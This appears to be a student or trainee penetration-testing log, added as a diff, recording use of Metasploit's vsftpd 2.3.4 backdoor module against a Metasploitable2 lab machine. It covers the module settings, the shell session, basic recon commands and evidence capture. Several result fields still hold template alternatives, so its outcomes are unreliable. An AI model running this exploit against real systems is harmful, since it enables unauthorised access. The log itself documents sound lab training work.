@@ -1,0 +1,80 @@
+===============================
+VAPT Exploitation Log - Week 3
+
+Date: [3 April 2026]
+Tester: Digvijoy Ranjan
+Environment: Kali Linux (Attacker) → Metasploitable2 (Target)
+
+---
+
+[1] Exploit Configuration
+
+Tool: Metasploit Framework
+Exploit: exploit/unix/ftp/vsftpd_234_backdoor
+Target IP: 192.168.1.100
+Payload: cmd/unix/interact
+
+Status: Configured Successfully
+
+---
+
+[2] Exploit Execution
+
+Command: run
+
+Result:
+[+] Backdoor service has been spawned successfully
+[+] Command shell session opened
+
+Status: Success
+
+---
+
+[3] Session Establishment
+
+Session Type: Command Shell / Meterpreter
+Session ID: 1
+
+Commands Executed:
+
+- whoami
+- uname -a
+
+Result:
+Access to target system confirmed
+
+---
+
+[4] Post-Exploitation
+
+Actions Performed:
+
+- Checked system information
+- Verified user privileges
+
+Commands:
+
+- id
+- sysinfo (if meterpreter)
+
+Result:
+Limited user access obtained
+
+---
+
+[5] Privilege Escalation (Attempt)
+
+Method: Manual / Metasploit local exploit
+Result: Attempted (Partial / Failed / Success)
+
+---
+
+[6] Evidence Collection
+
+- Screenshots captured (Figure 1–7)
+- Logs recorded
+- Network traffic captured using Wireshark
+
+---
+
+End of Log
